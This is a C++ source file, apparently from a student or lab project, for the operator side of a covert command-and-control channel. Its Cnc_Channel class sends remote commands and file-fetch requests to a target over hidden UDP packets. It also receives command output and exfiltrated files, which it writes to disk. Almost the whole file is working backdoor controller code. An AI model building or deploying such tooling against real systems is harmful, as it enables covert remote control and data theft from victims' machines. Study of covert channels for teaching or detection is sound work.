#include "cnc_channel.h"
#include "utilities.h"

#include <tins/tins.h>
#include <iostream>
#include <string>
#include <thread>
#include <QDebug>

using std::cout;
using std::endl;
using std::string;
using namespace Tins;

Cnc_Channel::Cnc_Channel(QObject *parent) : QObject(parent)
{

}

void Cnc_Channel::start(string ip, int port, string interface, int l_port) {

    config.target_addr.ip = ip;
    config.target_addr.port = port;
    config.interface = interface;
    config.listen_port = l_port;

    cout << "Start covert channel. " << endl;
    cout << "\t" << " config.target_addr.ip: "  << config.target_addr.ip << endl;
    cout << "\t" << " config.target_addr.port: "  << config.target_addr.port << endl;
    cout << "\t" << " config.interface: "  << config.interface << endl;
    cout << "\t" << " config.listen_port: "  << config.listen_port << endl;
    //detach a thread then return to gui
    std::thread(&Cnc_Channel::thread_call, this).detach();
}
void Cnc_Channel::thread_call(){
    setup();
}

bool Cnc_Channel::parse_command(Job& j){
    cout << "parse_command " << j.argument << endl;
    CMD cmd;
    try{
        cmd = cmdMap.right.find(j.command)->second;
    }
    catch(...){
        cout << "parse_command [failed] " << endl;
        return false;
    }

    switch(cmd) {
        case CMD::return_command :
           handle_ret_cmd(j);
           break; //optional
        case CMD::return_file :
            handle_return_file(j);
            break; //optional
        default :
            cout << "parse_command default switch case " << endl;
            return false;
    }
    return true;
}

bool Cnc_Channel::handle_ret_cmd(Job& j){
    emit appendText(QString::fromStdString(j.argument));
    return true;
}

bool Cnc_Channel::handle_return_file(Job& j){
    split_command_argument_with_regex(j.argument, j);
    Utilities::writefile(j.command, j.argument);
    return true;
}


bool Cnc_Channel::send_run_cmd(string cmd){
    string request;
    request += '[';
    request += cmdMap.left.find(CMD::run_command)->second;
    request += ']';
    request += cmd;
    std::vector<unsigned char> hidden(request.begin(), request.end());
    udp_send(config.target_addr.ip, config.target_addr.port, hidden);
    return true;
}

bool Cnc_Channel::send_file(string filename){
    Covert_Channel::send_file(config.target_addr.ip, config.target_addr.port, filename);
    return true;
}

bool Cnc_Channel::get_file(string filepath){
    string request;
    request += '[';
    request += cmdMap.left.find(CMD::get_file)->second;
    request += ']';
    request += filepath;
    std::vector<unsigned char> hidden(request.begin(), request.end());
    udp_send(config.target_addr.ip, config.target_addr.port, hidden);
    return true;
}

